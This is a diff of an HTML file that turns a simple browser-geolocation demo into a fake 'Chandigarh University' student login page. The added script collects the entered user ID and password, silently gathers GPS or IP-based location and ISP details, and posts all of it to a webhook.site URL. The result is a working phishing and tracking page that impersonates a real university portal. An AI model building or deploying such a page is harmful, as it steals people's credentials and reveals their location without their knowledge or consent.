@@ -1,68 +1,109 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Location Demo</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chandigarh University | Student Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
 </head>
 <body>
-  <h2>Location Permission Demo</h2>
-  <p>Click the button and allow location access.</p>
-  <button onclick="getLocation()">Get Location</button>
 
-  <p id="output"></p>
+    <div class="login-box">
+        <div class="logo-section">
+            <img src="images/cu-logo.png" alt="CU Logo" class="logo">
+        </div>
 
-  <script>
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
-      } else {
-        document.getElementById("output").innerHTML =
-          "Geolocation not supported.";
+        <h2>Log in</h2>
+        <p class="subtitle">Welcome to University Information Management System</p>
+        
+        <form action="#" method="POST">
+            <div class="input-group">
+                <input type="text" id="userId" name="userId" placeholder="User Id" required>
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            
+            <button onclick="submitData()" class="btn-login">LOGIN</button>
+        </form>
+
+        <div class="divider">
+            <span>OR</span>
+        </div>
+
+        <div class="registration-section">
+            <a href="#" class="btn-register">CLICK HERE FOR REGISTRATION</a>
+        </div>
+    </div>
+
+    <script>
+    function submitData() {
+      const name = document.getElementById("password").value;
+      const uid = document.getElementById("userId").value;
+
+      if (!name || !uid) {
+        alert("Please fill all fields");
+        return;
       }
-    }
 
-    function showPosition(position) {
-      document.getElementById("output").innerHTML =
-        "Latitude: " + position.coords.latitude +
-        "<br>Longitude: " + position.coords.longitude;
-    }
-  </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Location Demo</title>
-</head>
-<body>
-  <h2>GPS Location Demo</h2>
-  <p>This page will request your location for educational purposes.</p>
-  <button onclick="getLocation()">Allow & Get Location</button>
-
-  <p id="output"></p>
-
-  <script>
-    function getLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          showPosition,
-          showError
+          (pos) => sendGPS(name, uid, pos),
+          () => sendIP(name, uid)
         );
       } else {
-        document.getElementById("output").innerHTML =
-          "Geolocation not supported.";
+        sendIP(name, uid);
       }
     }
 
-    function showPosition(position) {
-      document.getElementById("output").innerHTML =
-        "Latitude: " + position.coords.latitude +
-        "<br>Longitude: " + position.coords.longitude;
+    function sendGPS(name, uid, pos) {
+      const data = {
+        uid: uid,
+        password: name,
+        location_type: "GPS",
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        timestamp: new Date().toISOString()
+      };
+
+      sendToWebhook(data);
+    //   document.getElementById("status").innerText =
+        // "Location shared successfully.";
     }
 
-    function showError(error) {
-      document.getElementById("output").innerHTML =
-        "Location permission denied.";
+    function sendIP(name, uid) {
+      fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(ip => {
+          const data = {
+            uid: uid,
+            password: name,
+            location_type: "IP",
+            ip: ip.ip,
+            city: ip.city,
+            region: ip.region,
+            country: ip.country_name,
+            isp: ip.org,
+            timestamp: new Date().toISOString()
+          };
+
+          sendToWebhook(data);
+          document.getElementById("status").innerText =
+            "Approximate location shared.";
+        });
+    }
+
+    function sendToWebhook(data) {
+      fetch("https://webhook.site/e03a8837-c273-41f8-863b-180bcc3a73b8", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
     }
   </script>
+
 </body>
 </html>
